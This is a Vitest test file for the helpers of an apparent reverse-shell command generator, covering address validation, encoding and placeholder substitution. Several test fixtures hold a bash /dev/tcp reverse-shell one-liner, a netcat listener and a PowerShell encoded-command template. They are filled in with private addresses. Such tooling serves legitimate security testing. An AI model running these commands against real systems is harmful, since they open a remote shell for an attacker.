import { describe, it, expect } from "vitest";
import {
  getFileExtension,
  isValidIPv4,
  isValidIPv6,
  isValidHostname,
  isValidIP,
  isValidPort,
  urlEncode,
  base64Encode,
  base64Decode,
  replacePlaceholders,
  generateCommand,
  groupBySubcategory,
  getOSTagColor,
  type ShellTemplate,
} from "./utils";

// ============================================================================
// getFileExtension Tests
// ============================================================================

describe("getFileExtension", () => {
  it("returns .ps1 for powershell types", () => {
    expect(getFileExtension("powershell")).toBe(".ps1");
    expect(getFileExtension("powershell-base64")).toBe(".ps1");
    expect(getFileExtension("powershell-2")).toBe(".ps1");
  });

  it("returns .py for python types", () => {
    expect(getFileExtension("python")).toBe(".py");
    expect(getFileExtension("python-2")).toBe(".py");
    expect(getFileExtension("python3")).toBe(".py");
  });

  it("returns .php for php types", () => {
    expect(getFileExtension("php")).toBe(".php");
    expect(getFileExtension("php-2")).toBe(".php");
  });

  it("returns .pl for perl types", () => {
    expect(getFileExtension("perl")).toBe(".pl");
    expect(getFileExtension("perl-2")).toBe(".pl");
  });

  it("returns .rb for ruby types", () => {
    expect(getFileExtension("ruby")).toBe(".rb");
    expect(getFileExtension("ruby-2")).toBe(".rb");
  });

  it("returns .js for nodejs types", () => {
    expect(getFileExtension("nodejs")).toBe(".js");
    expect(getFileExtension("nodejs-2")).toBe(".js");
  });

  it("returns .lua for lua types", () => {
    expect(getFileExtension("lua")).toBe(".lua");
    expect(getFileExtension("lua-2")).toBe(".lua");
  });

  it("returns .go for golang types", () => {
    expect(getFileExtension("golang")).toBe(".go");
    expect(getFileExtension("golang-2")).toBe(".go");
  });

  it("returns .rs for rust types", () => {
    expect(getFileExtension("rust")).toBe(".rs");
  });

  it("returns .java for java types", () => {
    expect(getFileExtension("java")).toBe(".java");
    expect(getFileExtension("java-2")).toBe(".java");
  });

  it("returns .cs for csharp types", () => {
    expect(getFileExtension("csharp")).toBe(".cs");
  });

  it("returns empty string for msfvenom types", () => {
    expect(getFileExtension("msfvenom")).toBe("");
    expect(getFileExtension("msfvenom-elf")).toBe("");
  });

  it("returns .sh as default for unknown types", () => {
    expect(getFileExtension("bash")).toBe(".sh");
    expect(getFileExtension("nc")).toBe(".sh");
    expect(getFileExtension("unknown")).toBe(".sh");
  });
});

// ============================================================================
// isValidIPv4 Tests
// ============================================================================

describe("isValidIPv4", () => {
  it("validates correct IPv4 addresses", () => {
    expect(isValidIPv4("127.0.0.1")).toBe(true);
    expect(isValidIPv4("192.168.1.1")).toBe(true);
    expect(isValidIPv4("10.0.0.1")).toBe(true);
    expect(isValidIPv4("255.255.255.255")).toBe(true);
    expect(isValidIPv4("0.0.0.0")).toBe(true);
    expect(isValidIPv4("10.10.10.10")).toBe(true);
  });

  it("rejects invalid IPv4 addresses", () => {
    expect(isValidIPv4("256.0.0.1")).toBe(false);
    expect(isValidIPv4("192.168.1")).toBe(false);
    expect(isValidIPv4("192.168.1.1.1")).toBe(false);
    expect(isValidIPv4("192.168.1.1a")).toBe(false);
    expect(isValidIPv4("")).toBe(false);
    expect(isValidIPv4("abc.def.ghi.jkl")).toBe(false);
    expect(isValidIPv4("-1.0.0.1")).toBe(false);
  });
});

// ============================================================================
// isValidIPv6 Tests
// ============================================================================

describe("isValidIPv6", () => {
  it("validates correct IPv6 addresses", () => {
    expect(isValidIPv6("::1")).toBe(true);
    expect(isValidIPv6("fe80::1")).toBe(true);
    expect(isValidIPv6("2001:0db8:85a3:0000:0000:8a2e:0370:7334")).toBe(true);
    expect(isValidIPv6("::")).toBe(true);
    expect(isValidIPv6("2001:db8::1")).toBe(true);
  });

  it("rejects invalid IPv6 addresses", () => {
    expect(isValidIPv6("192.168.1.1")).toBe(false);
    expect(isValidIPv6(":::1")).toBe(false);
    expect(isValidIPv6("")).toBe(false);
    expect(isValidIPv6("gggg::1")).toBe(false);
  });
});

// ============================================================================
// isValidHostname Tests
// ============================================================================

describe("isValidHostname", () => {
  it("validates correct hostnames", () => {
    expect(isValidHostname("localhost")).toBe(true);
    expect(isValidHostname("example.com")).toBe(true);
    expect(isValidHostname("sub.example.com")).toBe(true);
    expect(isValidHostname("my-server")).toBe(true);
    expect(isValidHostname("server-1.example.com")).toBe(true);
    expect(isValidHostname("a")).toBe(true);
  });

  it("rejects invalid hostnames", () => {
    expect(isValidHostname("")).toBe(false);
    expect(isValidHostname("-invalid")).toBe(false);
    expect(isValidHostname("invalid-")).toBe(false);
    expect(isValidHostname("a".repeat(254))).toBe(false);
    expect(isValidHostname("test..com")).toBe(false);
  });
});

// ============================================================================
// isValidIP Tests
// ============================================================================

describe("isValidIP", () => {
  it("accepts valid IPv4 addresses", () => {
    expect(isValidIP("192.168.1.1")).toBe(true);
    expect(isValidIP("10.0.0.1")).toBe(true);
    expect(isValidIP("127.0.0.1")).toBe(true);
  });

  it("accepts valid IPv6 addresses", () => {
    expect(isValidIP("::1")).toBe(true);
    expect(isValidIP("2001:db8::1")).toBe(true);
  });

  it("accepts valid hostnames", () => {
    expect(isValidIP("localhost")).toBe(true);
    expect(isValidIP("example.com")).toBe(true);
    expect(isValidIP("my-server.local")).toBe(true);
  });

  it("rejects invalid values", () => {
    expect(isValidIP("")).toBe(false);
    expect(isValidIP("256.256.256.256")).toBe(false);
    expect(isValidIP("-invalid-host")).toBe(false);
  });
});

// ============================================================================
// isValidPort Tests
// ============================================================================

describe("isValidPort", () => {
  it("validates correct port numbers", () => {
    expect(isValidPort("80")).toBe(true);
    expect(isValidPort("443")).toBe(true);
    expect(isValidPort("8080")).toBe(true);
    expect(isValidPort("1")).toBe(true);
    expect(isValidPort("65535")).toBe(true);
    expect(isValidPort("9001")).toBe(true);
  });

  it("rejects invalid port numbers", () => {
    expect(isValidPort("0")).toBe(false);
    expect(isValidPort("-1")).toBe(false);
    expect(isValidPort("65536")).toBe(false);
    expect(isValidPort("")).toBe(false);
    expect(isValidPort("abc")).toBe(false);
    expect(isValidPort("3.14")).toBe(false);
    expect(isValidPort("999999")).toBe(false);
  });
});

// ============================================================================
// urlEncode Tests
// ============================================================================

describe("urlEncode", () => {
  it("encodes special characters", () => {
    expect(urlEncode("hello world")).toBe("hello%20world");
    expect(urlEncode("a+b=c")).toBe("a%2Bb%3Dc");
    expect(urlEncode("test&value")).toBe("test%26value");
  });

  it("preserves alphanumeric characters", () => {
    expect(urlEncode("abc123")).toBe("abc123");
    expect(urlEncode("Test123")).toBe("Test123");
  });
});

// ============================================================================
// base64Encode / base64Decode Tests
// ============================================================================

describe("base64Encode and base64Decode", () => {
  it("encodes and decodes correctly", () => {
    const original = "Hello, World!";
    const encoded = base64Encode(original);
    const decoded = base64Decode(encoded);
    expect(decoded).toBe(original);
  });

  it("handles special characters", () => {
    const original = "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1";
    const encoded = base64Encode(original);
    const decoded = base64Decode(encoded);
    expect(decoded).toBe(original);
  });

  it("handles empty string", () => {
    expect(base64Encode("")).toBe("");
    expect(base64Decode("")).toBe("");
  });

  it("handles unicode", () => {
    const original = "你好世界";
    const encoded = base64Encode(original);
    const decoded = base64Decode(encoded);
    expect(decoded).toBe(original);
  });
});

// ============================================================================
// replacePlaceholders Tests
// ============================================================================

describe("replacePlaceholders", () => {
  it("replaces IP and PORT placeholders", () => {
    const command = "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1";
    const result = replacePlaceholders(command, "192.168.1.1", "4444");
    expect(result).toBe("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1");
  });

  it("replaces multiple occurrences", () => {
    const command = "connect {IP}:{PORT} and {IP}:{PORT}";
    const result = replacePlaceholders(command, "10.0.0.1", "8080");
    expect(result).toBe("connect 10.0.0.1:8080 and 10.0.0.1:8080");
  });

  it("handles commands without placeholders", () => {
    const command = "echo hello";
    const result = replacePlaceholders(command, "192.168.1.1", "4444");
    expect(result).toBe("echo hello");
  });
});

// ============================================================================
// generateCommand Tests
// ============================================================================

describe("generateCommand", () => {
  const baseTemplate: ShellTemplate = {
    type: "bash-tcp",
    name: "Bash TCP",
    icon: "🐚",
    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    description: "Test template",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -lvnp {PORT}",
  };

  it("replaces placeholders in command", () => {
    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
    expect(result.command).toBe("bash -i >& /dev/tcp/10.10.10.10/9001 0>&1");
  });

  it("replaces placeholders in listener", () => {
    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
    expect(result.listener).toBe("nc -lvnp 9001");
  });

  it("preserves other template properties", () => {
    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
    expect(result.type).toBe("bash-tcp");
    expect(result.name).toBe("Bash TCP");
    expect(result.icon).toBe("🐚");
    expect(result.description).toBe("Test template");
    expect(result.category).toBe("reverse");
    expect(result.subcategory).toBe("Shell Tools");
    expect(result.os).toEqual(["linux"]);
  });

  it("handles powershell-base64 specially", () => {
    const originalCommand = "powershell -enc {IP}:{PORT}";
    const encoded = base64Encode(originalCommand);

    const b64Template: ShellTemplate = {
      type: "powershell-base64",
      name: "PowerShell Base64",
      icon: "💻",
      command: encoded,
      description: "Base64 encoded PowerShell",
      category: "reverse",
      subcategory: "Windows",
      os: ["windows"],
    };

    const result = generateCommand(b64Template, "192.168.1.1", "4444");

    // The result should be re-encoded with replaced placeholders
    // The result should be re-encoded with replaced placeholders
    const decodedResult = base64Decode(result.command);
    expect(decodedResult).toBe("powershell -enc 192.168.1.1:4444");
    // Verified above
  });
});

// ============================================================================
// groupBySubcategory Tests
// ============================================================================

describe("groupBySubcategory", () => {
  const templates: ShellTemplate[] = [
    {
      type: "bash-1",
      name: "Bash 1",
      icon: "🐚",
      command: "bash",
      description: "Bash shell 1",
      category: "reverse",
      subcategory: "Shell Tools",
      os: ["linux"],
    },
    {
      type: "bash-2",
      name: "Bash 2",
      icon: "🐚",
      command: "bash2",
      description: "Bash shell 2",
      category: "reverse",
      subcategory: "Shell Tools",
      os: ["linux"],
    },
    {
      type: "python-1",
      name: "Python 1",
      icon: "🐍",
      command: "python",
      description: "Python shell",
      category: "reverse",
      subcategory: "Scripting Languages",
      os: ["linux", "mac"],
    },
  ];

  it("groups templates by subcategory", () => {
    const groups = groupBySubcategory(templates);

    expect(groups["Shell Tools"]).toHaveLength(2);
    expect(groups["Scripting Languages"]).toHaveLength(1);
  });

  it("preserves template order within groups", () => {
    const groups = groupBySubcategory(templates);

    expect(groups["Shell Tools"][0].type).toBe("bash-1");
    expect(groups["Shell Tools"][1].type).toBe("bash-2");
  });

  it("returns empty object for empty array", () => {
    const groups = groupBySubcategory([]);
    expect(groups).toEqual({});
  });
});

// ============================================================================
// getOSTagColor Tests
// ============================================================================

describe("getOSTagColor", () => {
  it("returns correct colors for known OS", () => {
    expect(getOSTagColor("linux")).toBe("#FCC624");
    expect(getOSTagColor("windows")).toBe("#0078D4");
    expect(getOSTagColor("mac")).toBe("#A2AAAD");
  });

  it("returns default color for unknown OS", () => {
    expect(getOSTagColor("unknown")).toBe("#888888");
    expect(getOSTagColor("")).toBe("#888888");
  });
});
